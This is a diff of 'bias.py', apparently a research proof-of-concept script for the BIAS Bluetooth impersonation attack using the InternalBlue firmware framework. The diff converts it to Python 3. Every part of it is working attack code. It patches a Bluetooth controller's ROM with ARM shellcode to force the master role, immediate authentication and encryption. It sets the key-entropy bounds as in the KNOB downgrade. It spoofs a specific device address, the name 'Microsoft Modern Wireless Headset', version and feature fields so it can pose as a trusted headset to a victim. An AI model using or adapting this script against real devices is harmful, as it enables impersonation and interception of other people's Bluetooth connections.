@@ -1,28 +1,28 @@
-# bias.py
+#!/usr/bin/env python3
 
 """
 Use it with internalblue
 
 """
-#!/usr/bin/python2
 
-from pwn import *
+from pwn import asm
 from internalblue.hcicore import HCICore
+import struct
+import sys
+import logging
 
 internalblue = HCICore()
-internalblue.interface = internalblue.device_list()[0][1]
+internalblue.interface = "hci0"
 
 # setup sockets
 if not internalblue.connect():
-    log.critical("No connection to target device.")
-    exit(-1)
+    logging.critical("No connection to target device.")
+    sys.exit(-1)
 
-
-
-log.info("BEGIN patchrom.")
+logging.info("BEGIN patchrom.")
 
 # patch1: make sure we always switch to master role
-code1 = b"""
+code1 = """
         @Part 1: Make sure we always switch roles
         mov r6, #0x0
         sub sp, #0x18
@@ -32,21 +32,17 @@ code1 = b"""
 addrcode1 = 0x2006d0
 taddrcode1 = addrcode1 + 1  # 0x2006d1
 # write code1 into addrcode1 (SRAM)
-code1Bytes = asm(code1, addrcode1)
+code1Bytes = asm(code1, vma=addrcode1)
 internalblue.writeMem(addrcode1, code1Bytes)
 # patch rom
 addrpatch1 = 0x2e7a8
-patch1 = asm("b {}".format(str(hex(taddrcode1))), vma=addrpatch1)
+patch1 = asm(f"b {taddrcode1:#x}", vma=addrpatch1)
 internalblue.patchRom(addrpatch1, patch1)
 
-
-# patch 2: immediately authenticate after setup
-
 code1len = len(code1Bytes)
-# 4-byte align
-code1len += 4 - (code1len % 4)
+code1len += 4 - (code1len % 4)  # 4-byte align
 
-code2 = b"""
+code2 = """
         @save lr
         push {lr}
 
@@ -63,24 +59,19 @@ code2 = b"""
         @return
         b 0x11a5d
         """
-
 # write code2 into SRAM
-code2Bytes =  asm(code2, addrcode1+code1len)
-internalblue.writeMem(addrcode1+code1len, code2Bytes)
+code2Bytes = asm(code2, vma=addrcode1 + code1len)
+internalblue.writeMem(addrcode1 + code1len, code2Bytes)
 
 code2len = len(code2Bytes)
-# 4-byte align
-code2len += 4 - (code2len % 4)
+code2len += 4 - (code2len % 4)  # 4-byte align
 
 # patch rom
 addrpatch2 = 0x11a58
-patch2 = asm("b 0x{:x}".format(taddrcode1 + code1len), vma=addrpatch2)
+patch2 = asm(f"b {taddrcode1 + code1len:#x}", vma=addrpatch2)
 internalblue.patchRom(addrpatch2, patch2)
 
-
-
-# patch 3: immediately enable encryption after authentication
-code3 = b"""
+code3 = """
         @ save registers
         push {r0, r1, lr}
 
@@ -104,41 +95,39 @@ code3 = b"""
         @ return
         b 0x11ce9
         """
-
 # write code3 into SRAM
-code3Bytes =  asm(code3, addrcode1+code1len+code2len)
-internalblue.writeMem(addrcode1+code1len+code2len, code3Bytes)
+code3Bytes = asm(code3, vma=addrcode1 + code1len + code2len)
+internalblue.writeMem(addrcode1 + code1len + code2len, code3Bytes)
 
 # patch rom
 addrpatch3 = 0x11ce4
-patch3 = asm("b 0x{:x}".format(taddrcode1+code1len+code2len), vma=addrpatch3)
+patch3 = asm(f"b {taddrcode1 + code1len + code2len:#x}", vma=addrpatch3)
 internalblue.patchRom(addrpatch3, patch3)
 
-log.info("END patchrom.")
+logging.info("END patchrom.")
 
-
-log.info("BEGIN impersonation.")
+logging.info("BEGIN impersonation.")
 
 # KNOB attack
-lmin = "\x01"
+lmin = b"\x07"
 addrlmin = 0x20118a
-lmax = "\x01"
+lmax = b"\x07"
 addrlmax = 0x20118b
 internalblue.writeMem(addrlmin, lmin)
 internalblue.writeMem(addrlmax, lmax)
 
 # btadd in little endian
-btadd_le = "\x5f\xbf\xa8\x36\x4e\x40"
+btadd_le = b"\xec\x40\xf7\x5e\x4a\xa0"
 internalblue.sendHciCommand(0xfc01, btadd_le)
 
-btname = "Name\x00"
+btname = "Microsoft Modern Wireless Headset\x00".encode()
 addrbtname = 0x200f48
 internalblue.writeMem(addrbtname, btname)
 
 # LMP_version
 specSupport = struct.unpack("<I", internalblue.readMem(0x200f12, 4))[0]
 specSupport &= 0xfffffe00
-lmpver = 9
+lmpver = 10
 if lmpver == 10:  # Bluetooth 5.1
     specSupport |= 0x100
 elif lmpver == 9:  # Bluetooth 5.0?
@@ -156,31 +145,31 @@ elif lmpver == 3:
 elif lmpver == 2:
     pass
 else:
-    raise Exception
+    raise Exception("Invalid LMP version")
 internalblue.writeMem(0x200f12, struct.pack("<I", specSupport))
 
 # Company Id
-companyid = 15
+companyid = 93
 addrcompanyid = 0x205c28
 internalblue.writeMem(addrcompanyid, struct.pack("<H", companyid))
 
 # Subversion Number
-subversion = 24841
+subversion = 34659
 addrsubversion = 0x200f3c
 internalblue.writeMem(addrsubversion, struct.pack("<H", subversion))
 
 # LMP feature page 0
-lmpfp0 = b"\xff\xfe\x8f\xfe\xd8\x3f\x5b\x87"
+lmpfp0 = b"\xff\xff\xff\xfa\xdb\xfd\x7b\x87"
 addrlmpfp0 = 0x200f24
 internalblue.writeMem(addrlmpfp0, lmpfp0)
 
 # LMP feature page 1
-lmpfp1 = b"\x0f\x00\x00\x00\x00\x00\x00\x00"
+lmpfp1 = b"\x03\x00\x00\x00\x00\x00\x00\x00"
 addrlmpfp1 = 0x200f2c
 internalblue.writeMem(addrlmpfp1, lmpfp1)
 
 # LMP feature page 2
-lmpfp2 = b"\x45\x03\x00\x00\x00\x00\x00\x00"
+lmpfp2 = b"\x1f\x00\x00\x00\x00\x00\x00\x00"
 addrlmpfp2 = 0x200f34
 internalblue.writeMem(addrlmpfp2, lmpfp2)
 
@@ -191,8 +180,8 @@ byte2 = struct.unpack("<B", internalblue.readMem(0x200f12, 1))[0]
 internalblue.writeMem(0x200f12, struct.pack("<B", byte2 & 0b11011111))
 
 # iocaps and authreq
-iocaps = "\x01"
-authreq = "\x03"
+iocaps = b"\x03"
+authreq = b"\x02"
 addrcapsauth = 0x20113d
 capsAndAuth = struct.pack("<B", struct.unpack("<B", iocaps)[0] | (struct.unpack("<B", authreq)[0] << 4))
 internalblue.writeMem(addrcapsauth, capsAndAuth)
@@ -205,13 +194,11 @@ byteNew = struct.pack("<B", (bytePrev & 0xfe) | oobdata)
 internalblue.writeMem(addroobdata, byteNew)
 
 # device class
-deviceclass = b"\x0c\x02\x5a"
+deviceclass = b"\x0a\x41\x0c"
 addrdeviceclass = 0x0c24
 internalblue.sendHciCommand(addrdeviceclass, deviceclass)
 
-log.info("END impersonation.")
-
+logging.info("END impersonation.")
 
 internalblue.shutdown()
-exit(-1)
-log.info("Ready to connect to a victim slave")
+sys.exit(-1)
